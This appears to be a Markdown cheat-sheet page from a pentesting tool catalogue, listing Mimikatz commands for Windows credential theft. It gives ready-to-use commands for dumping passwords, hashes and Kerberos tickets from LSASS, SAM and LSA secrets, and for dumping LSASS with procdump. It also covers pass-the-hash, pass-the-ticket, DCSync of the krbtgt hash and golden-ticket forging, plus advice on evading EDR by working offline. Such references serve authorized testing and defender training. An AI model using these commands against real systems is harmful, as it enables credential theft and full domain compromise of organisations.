---
name: Mimikatz
category: Post-Exploitation & PrivEsc
description: Extract plaintext passwords, hashes, PINs and Kerberos tickets from Windows memory.
tags: [mimikatz, credentials, lsass, kerberos, pth, ptt, windows]
---

# Mimikatz

**Mimikatz** extracts credentials from Windows memory: plaintext passwords, NTLM hashes, PINs and Kerberos tickets — primarily from the **LSASS** process. It also performs pass-the-hash, pass-the-ticket, golden/silver tickets and DCSync. Requires local admin / SeDebug.

> [github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) · flagged by AV/EDR — labs and authorized engagements only

## Start & privileges

```text
mimikatz # privilege::debug          :: must return "OK"
mimikatz # token::elevate            :: elevate to SYSTEM
mimikatz # log creds.txt             :: log output to file
```

## Dump credentials from memory

```text
mimikatz # sekurlsa::logonpasswords          :: passwords/hashes of logged-on users
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::msv                       :: NTLM hashes
mimikatz # sekurlsa::tickets /export           :: export Kerberos tickets (.kirbi)
mimikatz # lsadump::sam                         :: local SAM hashes
mimikatz # lsadump::secrets                     :: LSA secrets
```

## Working from an LSASS dump (offline, stealthier)

```text
:: capture dump on target (Task Manager > lsass > Create dump file, or procdump)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
:: then, offline:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## Pass-the-Hash / Pass-the-Ticket

```text
mimikatz # sekurlsa::pth /user:administrador /domain:CORP /ntlm:<HASH> /run:cmd.exe
mimikatz # kerberos::ptt ticket.kirbi
```

## DCSync & Golden Ticket (Domain Admin territory)

```text
:: DCSync — pull a user's hash from the DC (needs replication rights)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

:: Golden Ticket — forge a TGT with the krbtgt hash
mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt
```

## Related

```text
mimikatz # dpapi::cred                :: decrypt DPAPI blobs
mimikatz # vault::cred                 :: Windows Vault credentials
```

> LSASS access needs admin + SeDebug; EDR heavily monitors it — dumping LSASS and running Mimikatz **offline** is stealthier. Crack extracted hashes with [hashcat](#/tool/hashcat)/[john](#/tool/john); the cross-platform equivalent for many actions is [impacket](#/tool/impacket).
